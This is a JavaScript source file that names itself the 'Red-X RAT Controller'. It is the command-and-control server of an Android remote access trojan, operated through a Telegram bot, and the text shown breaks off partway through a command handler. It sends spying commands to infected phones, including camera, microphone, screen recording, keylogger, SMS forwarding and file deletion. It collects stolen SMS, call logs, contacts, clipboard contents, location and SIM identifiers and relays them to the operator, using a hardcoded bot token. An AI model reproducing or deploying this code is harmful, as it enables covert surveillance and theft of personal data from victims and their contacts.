const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// ========== CONFIGURATION ==========
const BOT_TOKEN = process.env.BOT_TOKEN || '8687604678:AAEJmrEYTLGri3gATkS343HRvMKwzWA-DMY';
const BOT_CHAT_ID = process.env.BOT_CHAT_ID || '8604942344';
const PORT = process.env.PORT || 3000;

// ========== INITIALIZE ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

// ========== TELEGRAM BOT ==========
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🤖 Bot is running...');

// ========== STORAGE ==========
const connectedDevices = new Map();
const appData = new Map();
const commandQueue = new Map();

// ========== MAIN KEYBOARD ==========
function getMainKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📱 Device Info', '📊 Status'],
                ['📨 SMS', '📞 Call'],
                ['📷 Camera', '🎥 Video'],
                ['🎬 Screen Record', '📸 Screenshot'],
                ['🎤 Mic', '🔊 Volume'],
                ['📁 Files', '📍 Location'],
                ['👥 Contacts', '📋 Clipboard'],
                ['🔦 Flashlight', '📶 WiFi'],
                ['📡 Bluetooth', '✈️ Airplane'],
                ['🌙 DND', '📳 Vibrate'],
                ['🔄 Reboot', '💀 Kill App'],
                ['📨 SMS Forward', '📤 Upload File'],
                ['⬇️ Download', '🗑️ Delete'],
                ['📂 List Files', '⚙️ System Info'],
                ['📱 Running Apps', '🧹 Clear Cache'],
                ['🔐 Keylogger', '📱 Remote Control']
            ],
            resize_keyboard: true
        }
    };
}

// ========== BUTTON TO COMMAND MAPPING ==========
const buttonToCommand = {
    // Device Info
    '📱 Device Info': 'getDeviceInfo',
    '📊 Status': 'getDeviceInfo',
    
    // Media
    '📷 Camera': 'takePhoto',
    '🎥 Video': 'takeVideo',
    '🎬 Screen Record': 'screenRecord',
    '📸 Screenshot': 'takeScreenshot',
    '🎤 Mic': 'recordAudio',
    
    // Volume
    '🔊 Volume Up': 'volumeUp',
    '🔉 Volume Down': 'volumeDown',
    '🔇 Mute': 'mute',
    '🔊 Unmute': 'unmute',
    
    // Files
    '📁 Files': 'listFiles',
    '📂 List Files': 'listFiles',
    
    // Location & Contacts
    '📍 Location': 'getLocation',
    '👥 Contacts': 'getContacts',
    
    // Clipboard
    '📋 Clipboard': 'getClipboard',
    
    // Flashlight
    '🔦 Turn On': 'flashlightOn',
    '🔦 Turn Off': 'flashlightOff',
    
    // WiFi
    '📶 WiFi On': 'wifiOn',
    '📶 WiFi Off': 'wifiOff',
    
    // Bluetooth
    '📡 BT On': 'bluetoothOn',
    '📡 BT Off': 'bluetoothOff',
    
    // System
    '✈️ Airplane': 'airplaneMode',
    '🌙 DND': 'doNotDisturb',
    '📳 Vibrate': 'vibrate',
    '🔄 Reboot': 'reboot',
    '💀 Kill App': 'killApp',
    
    // SMS Forward
    '📨 SMS Forward': 'enableSMSForward',
    
    // Files
    '📤 Upload File': 'uploadFile',
    '⬇️ Download': 'downloadFile',
    '🗑️ Delete': 'deleteFile',
    
    // System
    '⚙️ System Info': 'getSystemInfo',
    '📱 Running Apps': 'listRunningApps',
    '🧹 Clear Cache': 'clearCache',
    
    // Keylogger
    '▶️ Start': 'startKeylogger',
    '⏹️ Stop': 'stopKeylogger',
    '📊 Get Logs': 'getKeylogs',
    
    // Remote Control
    '📱 Remote Control': 'getFullDeviceInfo',
    
    // SMS
    '📨 SMS': 'sendSms',
    '📞 Call': 'makeCall'
};

// ========== HELPER FUNCTIONS ==========
function broadcastToAll(event, data) {
    io.emit(event, data);
}

function broadcastToDevice(deviceId, event, data) {
    for (let [socketId, id] of connectedDevices) {
        if (id === deviceId) {
            io.to(socketId).emit(event, data);
            return true;
        }
    }
    return false;
}

function sendCommandToDevice(chatId, command, extras = {}, target = 'all') {
    const requestId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const payload = {
        request: command,
        extras: extras,
        requestId: requestId,
        from: 'telegram'
    };

    commandQueue.set(requestId, { chatId, command, timestamp: Date.now() });

    let sent = false;
    if (target !== 'all') {
        sent = broadcastToDevice(target, 'message', payload);
    } else {
        broadcastToAll('message', payload);
        sent = true;
    }

    if (sent) {
        bot.sendMessage(chatId, `📤 Command "${command}" sent to ${target === 'all' ? 'ALL devices' : target}`);
    } else {
        bot.sendMessage(chatId, `❌ No device found: ${target}`);
    }
}

function formatSize(bytes) {
    if (!bytes) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
}

// ========== SOCKET.IO ==========
io.on('connection', (socket) => {
    console.log(`🔌 Client connected: ${socket.id}`);
    const deviceId = socket.handshake.query.deviceId || `device_${socket.id.substring(0, 8)}`;
    const platform = socket.handshake.query.platform || 'unknown';

    connectedDevices.set(socket.id, deviceId);
    
    if (!appData.has(deviceId)) {
        appData.set(deviceId, {
            id: deviceId,
            platform: platform,
            connectedAt: new Date().toISOString(),
            lastHeartbeat: new Date().toISOString(),
            smsForwarding: false
        });
    }

    console.log(`📱 Device connected: ${deviceId}`);

    // Send welcome to Telegram
    bot.sendMessage(BOT_CHAT_ID, 
        `📱 *New Device Connected*\n🆔: \`${deviceId}\`\n📱 Platform: ${platform}`,
        { parse_mode: 'Markdown', ...getMainKeyboard() }
    );

    // ========== DEVICE INFO ==========
    socket.on('deviceInfo', (data) => {
        try {
            const info = typeof data === 'string' ? JSON.parse(data) : data;
            const current = appData.get(deviceId) || {};
            appData.set(deviceId, { ...current, ...info, lastUpdate: new Date().toISOString() });
            console.log(`📊 Device info updated for ${deviceId}`);
            
            let message = `📊 *Device Info Update*\n🆔: ${deviceId}\n`;
            if (info.model) message += `📱 Model: ${info.model}\n`;
            if (info.androidVersion) message += `📱 Android: ${info.androidVersion}\n`;
            if (info.battery) message += `🔋 Battery: ${info.battery}\n`;
            if (info.storage) message += `💾 Storage: ${info.storage}\n`;
            if (info.network) message += `📶 Network: ${info.network}\n`;
            
            bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
        } catch (e) {
            console.error('Device info error:', e);
        }
    });

    // ========== RESPONSES ==========
    socket.on('response', (data) => {
        console.log(`📩 Response from ${deviceId}:`, data);
        
        const requestId = data.requestId;
        const queueItem = commandQueue.get(requestId);
        
        let message = `📨 *Command Response*\n📱 From: ${deviceId}\n`;
        
        if (queueItem) {
            message += `📌 Command: ${queueItem.command}\n`;
            if (data.response && data.response.status) {
                message += `📦 Status: ${data.response.status}`;
            } else if (data.status) {
                message += `📦 Status: ${data.status}`;
            } else {
                message += `📦 Data: ${JSON.stringify(data.response || data, null, 2)}`;
            }
            commandQueue.delete(requestId);
        } else {
            message += `📦 Data: ${JSON.stringify(data, null, 2)}`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== LOCATION ==========
    socket.on('location', (data) => {
        const lat = data.latitude || data.lat || 'Unknown';
        const lng = data.longitude || data.lng || 'Unknown';
        
        let message = `📍 *Location from ${deviceId}*\n`;
        message += `🌐 Latitude: ${lat}\n`;
        message += `🌐 Longitude: ${lng}\n`;
        if (data.accuracy) message += `🎯 Accuracy: ${data.accuracy}m\n`;
        if (data.altitude) message += `⛰️ Altitude: ${data.altitude}m\n`;
        if (data.speed) message += `🚀 Speed: ${data.speed}m/s\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
        
        if (lat !== 'Unknown' && lng !== 'Unknown') {
            bot.sendLocation(BOT_CHAT_ID, parseFloat(lat), parseFloat(lng));
        }
    });

    // ========== FILE LIST ==========
    socket.on('fileList', (data) => {
        const files = Array.isArray(data) ? data : (data.files || data.apps || []);
        let message = `📂 *Files from ${deviceId}*\n`;
        message += `📁 Total: ${files.length}\n\n`;
        
        if (files.length === 0) {
            message += 'No files found or directory is empty.';
        } else {
            files.slice(0, 25).forEach((file, index) => {
                const isDir = file.isDirectory ? '📁' : '📄';
                const size = file.size ? `(${formatSize(file.size)})` : '';
                message += `${index + 1}. ${isDir} ${file.name || 'Unknown'} ${size}\n`;
            });
            if (files.length > 25) {
                message += `\n... and ${files.length - 25} more`;
            }
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== APP LIST ==========
    socket.on('appList', (data) => {
        const apps = data.apps || data || [];
        let message = `📱 *Apps on ${deviceId}*\n`;
        message += `📊 Total: ${apps.length}\n\n`;
        
        const systemApps = apps.filter(a => a.isSystem).length;
        const userApps = apps.filter(a => a.isUser).length;
        message += `📱 User Apps: ${userApps}\n`;
        message += `⚙️ System Apps: ${systemApps}\n\n`;
        
        apps.slice(0, 20).forEach((app, index) => {
            const type = app.isSystem ? '⚙️' : '📱';
            message += `${index + 1}. ${type} ${app.name || app.packageName}\n`;
        });
        if (apps.length > 20) {
            message += `\n... and ${apps.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== RUNNING APPS ==========
    socket.on('runningApps', (data) => {
        const apps = data.apps || data || [];
        let message = `🔄 *Running Apps on ${deviceId}*\n`;
        message += `📊 Total: ${apps.length}\n\n`;
        
        apps.slice(0, 20).forEach((app, index) => {
            message += `${index + 1}. ${app.name || app.packageName}`;
            if (app.pid) message += ` (PID: ${app.pid})`;
            if (app.importance !== undefined) message += ` [${app.importance}]`;
            message += `\n`;
        });
        if (apps.length > 20) {
            message += `\n... and ${apps.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== APP INFO ==========
    socket.on('appInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *App Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📱 Name: ${info.name || 'Unknown'}\n`;
        message += `📦 Package: ${info.packageName || 'Unknown'}\n`;
        message += `📌 Version: ${info.versionName || 'Unknown'}\n`;
        message += `🔢 Code: ${info.versionCode || 'Unknown'}\n`;
        message += `⚙️ System: ${info.isSystem ? '✅ Yes' : '❌ No'}\n`;
        if (info.installTime) message += `📅 Installed: ${info.installTime}\n`;
        if (info.updateTime) message += `🔄 Updated: ${info.updateTime}\n`;
        if (info.permissions && info.permissions.length > 0) {
            message += `\n🔐 Permissions: ${info.permissions.length}\n`;
            info.permissions.slice(0, 10).forEach(p => message += `   - ${p}\n`);
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== WHATSAPP STATUS ==========
    socket.on('whatsappStatus', (data) => {
        const installed = data.installed ? '✅ Installed' : '❌ Not Installed';
        let message = `💬 *WhatsApp Status*\n📱 Device: ${deviceId}\n📊 Status: ${installed}`;
        if (data.versionName) message += `\n📌 Version: ${data.versionName}`;
        if (data.versionCode) message += `\n🔢 Code: ${data.versionCode}`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== WHATSAPP CONTACTS ==========
    socket.on('whatsappContacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👥 *WhatsApp Contacts*\n📱 Device: ${deviceId}\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 25).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - ${contact.number || 'N/A'}\n`;
        });
        if (contacts.length > 25) {
            message += `\n... and ${contacts.length - 25} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== EMAIL LIST ==========
    socket.on('emailList', (data) => {
        const emails = Array.isArray(data) ? data : [];
        let message = `📧 *Emails on ${deviceId}*\n📊 Total: ${emails.length}\n\n`;
        
        emails.slice(0, 20).forEach((email, index) => {
            message += `${index + 1}. ${email.name || 'Unknown'} - ${email.email}\n`;
        });
        if (emails.length > 20) {
            message += `\n... and ${emails.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== EMAIL CONTACTS ==========
    socket.on('emailContacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👤 *Email Contacts*\n📱 Device: ${deviceId}\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 20).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - ${contact.email}\n`;
        });
        if (contacts.length > 20) {
            message += `\n... and ${contacts.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SMS LIST ==========
    socket.on('smsList', (data) => {
        const smsList = Array.isArray(data) ? data : [];
        let message = `📨 *SMS Messages*\n📱 Device: ${deviceId}\n📊 Total: ${smsList.length}\n\n`;
        
        smsList.slice(0, 15).forEach((sms, index) => {
            message += `${index + 1}. 📱 From: ${sms.from || 'Unknown'}\n`;
            message += `   📝 ${sms.message || ''}\n`;
            message += `   🕐 ${sms.time || 'N/A'}\n\n`;
        });
        if (smsList.length > 15) {
            message += `... and ${smsList.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== CALL LOGS ==========
    socket.on('callLogs', (data) => {
        const calls = Array.isArray(data) ? data : [];
        let message = `📞 *Call Logs*\n📱 Device: ${deviceId}\n📊 Total: ${calls.length}\n\n`;
        
        const emojis = { 'Incoming': '📥', 'Outgoing': '📤', 'Missed': '❌' };
        calls.slice(0, 15).forEach((call, index) => {
            const emoji = emojis[call.type] || '📞';
            message += `${index + 1}. ${emoji} ${call.name || call.number || 'Unknown'}\n`;
            message += `   📌 Type: ${call.type || 'Unknown'}\n`;
            message += `   ⏱️ Duration: ${call.duration || 'N/A'}\n`;
            message += `   🕐 ${call.time || 'N/A'}\n\n`;
        });
        if (calls.length > 15) {
            message += `... and ${calls.length - 15} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== CONTACTS ==========
    socket.on('contacts', (data) => {
        const contacts = Array.isArray(data) ? data : [];
        let message = `👥 *Contacts on ${deviceId}*\n📊 Total: ${contacts.length}\n\n`;
        
        contacts.slice(0, 25).forEach((contact, index) => {
            message += `${index + 1}. ${contact.name || 'Unknown'} - ${contact.number || 'N/A'}\n`;
        });
        if (contacts.length > 25) {
            message += `\n... and ${contacts.length - 25} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SYSTEM INFO ==========
    socket.on('systemInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `⚙️ *System Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📱 Model: ${info.model || 'Unknown'}\n`;
        message += `📱 Android: ${info.androidVersion || 'Unknown'}\n`;
        if (info.manufacturer) message += `🏷️ Manufacturer: ${info.manufacturer}\n`;
        if (info.brand) message += `🏷️ Brand: ${info.brand}\n`;
        if (info.device) message += `📱 Device: ${info.device}\n`;
        message += `🔧 CPU: ${info.cpu || 'Unknown'}\n`;
        message += `⚡ Cores: ${info.cores || 'Unknown'}\n`;
        message += `💾 RAM Total: ${info.totalRam || 'Unknown'}\n`;
        message += `💾 RAM Available: ${info.availableRam || 'Unknown'}\n`;
        message += `💾 RAM Used: ${info.usedRam || 'Unknown'}\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== FULL DEVICE INFO ==========
    socket.on('fullDeviceInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *Full Device Info*\n🆔: ${deviceId}\n\n`;
        message += `📱 Model: ${info.model || 'Unknown'}\n`;
        message += `🏷️ Brand: ${info.brand || 'Unknown'}\n`;
        message += `🏷️ Manufacturer: ${info.manufacturer || 'Unknown'}\n`;
        message += `📱 Android: ${info.androidVersion || 'Unknown'}\n`;
        message += `🔧 API Level: ${info.apiLevel || 'Unknown'}\n`;
        if (info.fingerprint) message += `🔑 Fingerprint: ${info.fingerprint.substring(0, 50)}...\n`;
        message += `🔋 Battery: ${info.batteryLevel || 'Unknown'}%\n`;
        message += `💾 Storage Total: ${info.totalStorage || 'Unknown'}\n`;
        message += `💾 Storage Available: ${info.availableStorage || 'Unknown'}\n`;
        message += `💾 RAM Total: ${info.totalRam || 'Unknown'}\n`;
        message += `💾 RAM Available: ${info.availableRam || 'Unknown'}\n`;
        message += `📶 WiFi: ${info.wifiEnabled ? '✅ ON' : '❌ OFF'}\n`;
        message += `📡 Bluetooth: ${info.bluetoothEnabled ? '✅ ON' : '❌ OFF'}\n`;
        if (info.simState) message += `📱 SIM State: ${info.simState}\n`;
        if (info.networkOperator) message += `📶 Network: ${info.networkOperator}\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== BATTERY INFO ==========
    socket.on('batteryInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `🔋 *Battery Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📊 Level: ${info.level || 'Unknown'}%\n`;
        message += `⚡ Status: ${info.status || 'Unknown'}\n`;
        if (info.plugged) message += `🔌 Plugged: ${info.plugged}\n`;
        if (info.health) message += `❤️ Health: ${info.health}\n`;
        if (info.temperature) message += `🌡️ Temperature: ${info.temperature}°C\n`;
        if (info.voltage) message += `⚡ Voltage: ${info.voltage}mV\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== NETWORK INFO ==========
    socket.on('networkInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📶 *Network Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📶 WiFi: ${info.wifiEnabled ? '✅ ON' : '❌ OFF'}\n`;
        if (info.wifiSSID) {
            message += `📡 SSID: ${info.wifiSSID || 'N/A'}\n`;
            if (info.wifiRSSI) message += `📶 Signal: ${info.wifiRSSI} dBm\n`;
            if (info.wifiSpeed) message += `🚀 Speed: ${info.wifiSpeed} Mbps\n`;
            if (info.wifiIPAddress) message += `🌐 IP: ${info.wifiIPAddress}\n`;
        }
        if (info.networkOperator) message += `📱 Network: ${info.networkOperator}\n`;
        if (info.networkType) message += `📶 Network Type: ${info.networkType}\n`;
        if (info.ipAddress) message += `🌐 IP Address: ${info.ipAddress}\n`;
        if (info.mobileDataEnabled !== undefined) {
            message += `📱 Mobile Data: ${info.mobileDataEnabled ? '✅ ON' : '❌ OFF'}\n`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SIM INFO ==========
    socket.on('simInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📱 *SIM Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📶 SIM State: ${info.simState || 'Unknown'}\n`;
        if (info.networkOperator) message += `📱 Network: ${info.networkOperator}\n`;
        if (info.networkOperatorCode) message += `📶 Network Code: ${info.networkOperatorCode}\n`;
        if (info.phoneType) message += `📱 Phone Type: ${info.phoneType}\n`;
        if (info.simCountryIso) message += `🌍 Country: ${info.simCountryIso}\n`;
        if (info.simOperatorName) message += `📱 Operator: ${info.simOperatorName}\n`;
        if (info.phoneCount) message += `📱 Phone Count: ${info.phoneCount}\n`;
        if (info.subscriberId) message += `🆔 Subscriber ID: ${info.subscriberId}\n`;
        if (info.deviceId) message += `🆔 Device ID: ${info.deviceId}\n`;
        
        if (info.subscriptions && info.subscriptions.length > 0) {
            message += `\n📋 Subscriptions: ${info.subscriptions.length}\n`;
            info.subscriptions.forEach(sub => {
                message += `   - ${sub.displayName || 'Unknown'} (${sub.carrierName || 'Unknown'})\n`;
            });
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== STORAGE STATS ==========
    socket.on('storageStats', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `💾 *Storage Stats*\n📱 Device: ${deviceId}\n\n`;
        message += `📁 Internal:\n`;
        message += `   📊 Total: ${info.internalTotal || 'Unknown'}\n`;
        message += `   📊 Available: ${info.internalAvailable || 'Unknown'}\n`;
        message += `   📊 Used: ${info.internalUsed || 'Unknown'}\n`;
        if (info.externalTotal) {
            message += `\n📁 External:\n`;
            message += `   📊 Total: ${info.externalTotal}\n`;
            message += `   📊 Available: ${info.externalAvailable}\n`;
            message += `   📊 Used: ${info.externalUsed}\n`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== WIFI NETWORKS ==========
    socket.on('wifiNetworks', (data) => {
        const networks = Array.isArray(data) ? data : [];
        let message = `📶 *WiFi Networks*\n📱 Device: ${deviceId}\n📊 Total: ${networks.length}\n\n`;
        
        networks.slice(0, 20).forEach((network, index) => {
            const lock = network.capabilities && network.capabilities.includes('WPA') ? '🔒' : '🔓';
            message += `${index + 1}. ${lock} ${network.ssid || 'Hidden'}\n`;
            if (network.strength) message += `   📶 Signal: ${network.strength}\n`;
            if (network.frequency) message += `   📡 Frequency: ${network.frequency}MHz\n`;
            if (network.bssid) message += `   📡 BSSID: ${network.bssid}\n`;
            message += `\n`;
        });
        if (networks.length > 20) {
            message += `... and ${networks.length - 20} more`;
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== BLUETOOTH DEVICES ==========
    socket.on('bluetoothDevices', (data) => {
        const devices = Array.isArray(data) ? data : [];
        let message = `📡 *Bluetooth Devices*\n📱 Device: ${deviceId}\n📊 Total: ${devices.length}\n\n`;
        
        devices.forEach((device, index) => {
            message += `${index + 1}. ${device.name || 'Unknown'}\n`;
            if (device.address) message += `   📡 Address: ${device.address}\n`;
            if (device.bondState !== undefined) message += `   🔗 Bond State: ${device.bondState}\n`;
        });
        
        if (devices.length === 0) {
            message += 'No paired devices found';
        }
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== FILE INFO ==========
    socket.on('fileInfo', (data) => {
        const info = typeof data === 'string' ? JSON.parse(data) : data;
        let message = `📄 *File Info*\n📱 Device: ${deviceId}\n\n`;
        message += `📄 Name: ${info.name || 'Unknown'}\n`;
        message += `📂 Path: ${info.path || 'Unknown'}\n`;
        message += `📦 Size: ${info.size || 'Unknown'}\n`;
        message += `📁 Type: ${info.isDirectory ? 'Directory' : 'File'}\n`;
        message += `🔒 Hidden: ${info.isHidden ? '✅ Yes' : '❌ No'}\n`;
        message += `📝 Read: ${info.canRead ? '✅' : '❌'}\n`;
        message += `✏️ Write: ${info.canWrite ? '✅' : '❌'}\n`;
        if (info.canExecute !== undefined) message += `▶️ Execute: ${info.canExecute ? '✅' : '❌'}\n`;
        if (info.lastModified) message += `🕐 Modified: ${info.lastModified}\n`;
        if (info.childCount !== undefined) message += `📁 Contents: ${info.childCount} items\n`;
        
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== CLIPBOARD ==========
    socket.on('clipboard', (data) => {
        const text = typeof data === 'string' ? data : (data.text || data.clipboard || JSON.stringify(data));
        let message = `📋 *Clipboard Content*\n📱 Device: ${deviceId}\n\n📝 `;
        message += text.length > 500 ? text.substring(0, 500) + '...' : text;
        bot.sendMessage(BOT_CHAT_ID, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
    });

    // ========== SMS FORWARD ==========
    socket.on('smsForward', (data) => {
        const device = appData.get(deviceId) || {};
        if (device.smsForwarding) {
            bot.sendMessage(BOT_CHAT_ID,
                `📨 *SMS Forwarded*\n📱 Device: ${deviceId}\n📱 From: ${data.from || 'Unknown'}\n📝 Message: ${data.message || ''}\n🕐 Time: ${data.time || 'N/A'}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
        } else {
            console.log(`📨 SMS received but forwarding disabled for ${deviceId}`);
        }
    });

    // ========== HEARTBEAT ==========
    socket.on('heartbeat', (data) => {
        const current = appData.get(deviceId) || {};
        appData.set(deviceId, { ...current, lastHeartbeat: new Date().toISOString() });
    });

    // ========== DISCONNECT ==========
    socket.on('disconnect', () => {
        console.log(`🔌 Client disconnected: ${socket.id}`);
        const id = connectedDevices.get(socket.id);
        if (id) {
            connectedDevices.delete(socket.id);
            bot.sendMessage(BOT_CHAT_ID,
                `📱 *Device Disconnected*\n🆔: ${id}`,
                { parse_mode: 'Markdown', ...getMainKeyboard() }
            );
        }
    });
});

// ========== TELEGRAM BOT COMMANDS ==========

// /start - Show main menu
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;
    
    let message = `🚀 *Red-X RAT Controller*\n\n`;
    message += `📱 Connected Devices: ${connectedDevices.size}\n`;
    message += `🔌 Use buttons below to control your devices!\n\n`;
    message += `📌 *Quick Commands:*\n`;
    message += `/status - Device status\n`;
    message += `/list - List devices\n`;
    message += `/help - All commands`;
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /help - Show all commands
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    let message = `📚 *Red-X RAT Commands*\n\n`;
    message += `📱 *Basic:*\n`;
    message += `/status - Device status\n`;
    message += `/list - List devices\n`;
    message += `/device - Full device info\n\n`;
    
    message += `📷 *Media:*\n`;
    message += `/camera - Take photo\n`;
    message += `/video - Record video\n`;
    message += `/screenshot - Take screenshot\n`;
    message += `/screenrecord - Record screen\n`;
    message += `/mic - Record audio\n\n`;
    
    message += `🔦 *System:*\n`;
    message += `/flash on|off - Flashlight\n`;
    message += `/wifi on|off - WiFi\n`;
    message += `/bt on|off - Bluetooth\n`;
    message += `/airplane - Airplane mode\n`;
    message += `/dnd - Do Not Disturb\n`;
    message += `/reboot - Reboot device\n`;
    message += `/lock - Lock screen\n\n`;
    
    message += `📨 *Communication:*\n`;
    message += `/sms +123|Hello - Send SMS\n`;
    message += `/call +123 - Make call\n`;
    message += `/smslist - List all SMS\n`;
    message += `/calllogs - Call history\n\n`;
    
    message += `📁 *Files:*\n`;
    message += `/files /sdcard - List files\n`;
    message += `/delete /path - Delete file\n`;
    message += `/fileinfo /path - File info\n`;
    message += `/mkdir /path - Create folder\n`;
    message += `/storage - Storage stats\n\n`;
    
    message += `📱 *Apps:*\n`;
    message += `/apps - List all apps\n`;
    message += `/running - Running apps\n`;
    message += `/appinfo com.package - App info\n`;
    message += `/open com.package - Open app\n`;
    message += `/kill com.package - Kill app\n\n`;
    
    message += `💬 *WhatsApp:*\n`;
    message += `/whatsapp +123|Hello - Send WhatsApp\n`;
    message += `/whatsappcheck - Check installed\n`;
    message += `/whatsappcontacts - Get contacts\n\n`;
    
    message += `📧 *Emails:*\n`;
    message += `/emails - List emails\n`;
    message += `/emailcontacts - Email contacts\n\n`;
    
    message += `📍 *Location & Contacts:*\n`;
    message += `/location - Get location\n`;
    message += `/contacts - Get contacts\n\n`;
    
    message += `📋 *Clipboard:*\n`;
    message += `/clipboardget - Get clipboard\n`;
    message += `/clipboardset Hello - Set clipboard\n\n`;
    
    message += `📶 *Network:*\n`;
    message += `/wifinetworks - WiFi networks\n`;
    message += `/btdevices - Bluetooth devices\n`;
    message += `/sim - SIM info\n`;
    message += `/network - Network info\n`;
    message += `/battery - Battery info\n\n`;
    
    message += `🔐 *Keylogger:*\n`;
    message += `/keylogger start|stop - Control keylogger\n`;
    message += `/keylogget - Get keylogs\n\n`;
    
    message += `📨 *SMS Forward:*\n`;
    message += `/forward on|off - SMS forwarding\n\n`;
    
    message += `🔄 *Misc:*\n`;
    message += `/vibrate 500 - Vibrate\n`;
    message += `/wallpaper /path - Set wallpaper\n`;
    message += `/clearnotif - Clear notifications\n`;
    message += `/reboot - Reboot device`;
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

    let status = `📊 *Device Status*\n`;
    status += `📱 Connected: ${connectedDevices.size}\n\n`;
    
    if (connectedDevices.size === 0) {
        status += 'No devices connected. Open the APK on your phone.';
    } else {
        for (let [socketId, deviceId] of connectedDevices) {
            const info = appData.get(deviceId) || {};
            status += `🆔 *${deviceId}*\n`;
            status += `   📱 Platform: ${info.platform || 'unknown'}\n`;
            status += `   🔌 Connected: ${info.connectedAt ? new Date(info.connectedAt).toLocaleString() : 'recently'}\n`;
            if (info.lastHeartbeat) {
                status += `   ❤️ Last Heartbeat: ${new Date(info.lastHeartbeat).toLocaleString()}\n`;
            }
            status += `   📨 SMS Forward: ${info.smsForwarding ? '✅' : '❌'}\n\n`;
        }
    }

    bot.sendMessage(chatId, status, { parse_mode: 'Markdown', ...getMainKeyboard() });
});

// /list
bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== BOT_CHAT_ID) return;

